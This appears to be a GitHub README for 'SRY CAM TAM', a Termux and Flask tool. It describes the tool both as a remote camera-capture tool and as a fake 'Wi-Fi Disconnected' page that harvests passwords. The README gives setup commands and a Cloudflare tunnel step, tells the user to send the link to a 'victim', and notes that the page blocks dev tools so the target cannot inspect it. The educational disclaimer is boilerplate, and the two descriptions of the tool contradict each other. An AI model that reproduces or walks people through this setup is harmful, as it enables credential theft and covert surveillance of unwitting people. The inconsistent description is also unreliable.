<h1 align="center">👾 SRY CAM TAM</h1>
<p align="center"><b>MADED BY 𒉭 ᎠᴀʀᴋㅤᏙᴇɴᴏᴍㅤ×͜× | 𝐓𝐇𝐄 𝐀𝐋𝐏𝐇𝐀 𒉭</b></p>

<p align="center">
  <img src="https://img.shields.io/badge/Made%20With-Python-blue?style=flat-square" />
  <img src="https://img.shields.io/badge/Platform-Termux-informational?style=flat-square" />
  <img src="https://img.shields.io/badge/Tool-Type-Social_Engineering-critical?style=flat-square" />
  <img src="https://img.shields.io/badge/Status-Final-green?style=flat-square" />
</p>

<p align="center">
  <a href="https://youtube.com/@official_cyber_satyam27?si=KIjUlKKtDObLRGT9"><img src="https://img.shields.io/badge/youtube-s--ry-critical?style=flat-square&logo=instagram"></a>


---

## 🧠 About

SRY CAM TAM  is a **camera tool for educational purposes** that allows capturing images from front and back cameras remotely via a Cloudflare tunnel link. This tool is designed **only for learning, ethical testing, and personal projects**. Misuse of this tool for spying or unauthorized access is illegal.
---

## 🛠️ Features

- ✅ Looks like a real "Wi-Fi Disconnected" prompt  
- ✅ Freezes page until password is entered  
- ✅ Blocks inspect, copy, or dev tools  
- ✅ Spinner + fake reconnection animation  
- ✅ Captures password in Termux live  
- ✅ Built-in YouTube subscription check  
- ✅ Lightweight Flask-based interface

---

## ⚙️ Full Termux Setup (From Scratch)

### 🔁 1. Install Termux Packages

```bash
pkg update && pkg upgrade -y
pkg install python git -y
pip install flask
pkg install cloudflared -y
```

### 📥 2. Clone the Tool

```bash
git clone https://github.com/OFFICIALcybersatyam27/SRY-CAM-TAM-.git
cd SRY-CAM-TAM-
```

### 🔐 3. Start the Tool

```bash
python main.py

```

👉 You will be redirected to sryYouTube channel  
👉 After subscribing, return and press **Enter** to continue

---

## ☁️ Cloudflared Tunnel Setup

Open **another Termux tab**, and run:

```bash
cloudflared tunnel --url http://127.0.0.1:8080
```

✅ You’ll get a public link like:
```
https://something.trycloudflare.com
```

💬 Send that link to your victim/test user.  
🛑 When they enter their Wi-Fi password, it will show in Termux.

---

## 📦 Requirements

- Python 3  
- Flask (`pip install flask`)  
- Termux  
- Cloudflared (`pkg install cloudflared`)

Optional:
```bash
pip install -r requirements.txt
```

---

## ⚠️ Disclaimer

> This tool is made strictly for **educational purposes**, awareness demos, and legal penetration testing.  
> Do not use it without clear, written permission.  
> The developer is **not responsible for any misuse**.

---

## 💬 Hacker Quote

> “The quieter you become, the more you are able to hear.” — Anonymous

---

